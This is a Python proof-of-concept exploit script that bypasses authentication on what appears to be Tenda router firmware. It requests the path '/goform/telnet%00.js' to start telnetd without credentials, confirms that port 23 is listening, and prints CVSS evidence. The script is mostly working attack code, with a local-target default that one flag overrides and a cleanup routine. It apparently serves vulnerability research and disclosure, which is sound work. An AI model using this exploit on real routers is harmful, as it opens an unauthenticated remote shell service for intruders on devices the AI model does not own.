#!/usr/bin/env python3
"""
PoC: unauthenticated route-confusion bypass starts telnetd.

Default target is the local emulated firmware at http://127.0.0.1:18080.
"""

import argparse
import ipaddress
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


def require_private_target(base_url, allow_nonlocal):
    host = urllib.parse.urlparse(base_url).hostname
    if not host:
        raise SystemExit("target URL needs a hostname")
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
    except OSError as exc:
        raise SystemExit(f"could not resolve target host {host}: {exc}") from exc
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")


def request(base_url, path):
    url = base_url.rstrip("/") + path
    req = urllib.request.Request(url, method="GET")
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=4) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read()
    except urllib.error.URLError as exc:
        return 0, {}, str(exc).encode()


def docker_sh(container, command):
    return subprocess.run(
        ["docker", "exec", container, "/bin/sh", "-c", command],
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    ).stdout


def cleanup_telnet(container):
    docker_sh(container, "for p in $(ps | awk '/[t]elnetd/{print $1}'); do kill -9 \"$p\" 2>/dev/null || true; done")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:18080")
    parser.add_argument("--container", default="tenda-b104-native-httpd")
    parser.add_argument("--no-cleanup", action="store_true")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    require_private_target(args.target, args.allow_nonlocal)

    cleanup_telnet(args.container)
    baseline_status, baseline_headers, _ = request(args.target, "/goform/telnet")
    exploit_status, _, exploit_body = request(args.target, "/goform/telnet%00.js")
    time.sleep(1)

    listeners = docker_sh(args.container, "ps; ss -ltnup 2>/dev/null || netstat -ltnup 2>/dev/null || true")
    vulnerable = "telnetd" in listeners and ":23" in listeners

    print("[baseline] GET /goform/telnet")
    print(f"  status={baseline_status} location={baseline_headers.get('Location', '')}")
    print("[exploit] GET /goform/telnet%00.js")
    print(f"  status={exploit_status} body={exploit_body[:120]!r}")
    print("[validation] telnet listener check")
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  evidence: telnetd is running and TCP/23 is listening without authentication")
        print("  cvss evidence: AV:N/AC:L/PR:N/UI:N; enables a remote shell service from an unauthenticated request")
    else:
        print(listeners)

    if not args.no_cleanup:
        cleanup_telnet(args.container)
        print("[cleanup] killed spawned telnetd")

    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()
